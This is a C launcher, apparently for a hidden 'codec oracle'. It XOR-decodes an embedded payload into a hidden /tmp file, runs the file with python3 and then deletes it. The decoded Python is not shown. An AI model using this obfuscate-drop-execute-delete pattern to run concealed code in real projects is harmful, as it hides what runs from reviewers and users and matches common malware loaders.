#include <fcntl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>
#include "oracle_payload.h"

#ifndef ORACLE_MODE_VALUE
#define ORACLE_MODE_VALUE "legacy"
#endif

int main(void) {
    char path[] = "/tmp/.codec-oracle-XXXXXX";
    int fd = mkstemp(path);
    if (fd < 0) return 111;
    for (unsigned long i = 0; i < payload_len; ++i) {
        unsigned char byte = payload[i] ^ 0xA7;
        if (write(fd, &byte, 1) != 1) return 112;
    }
    close(fd);
    setenv("ORACLE_MODE", ORACLE_MODE_VALUE, 1);
    pid_t pid = fork();
    if (pid == 0) {
        execlp("python3", "python3", path, (char *)0);
        _exit(127);
    }
    int status = 0;
    waitpid(pid, &status, 0);
    unlink(path);
    return WIFEXITED(status) ? WEXITSTATUS(status) : 113;
}
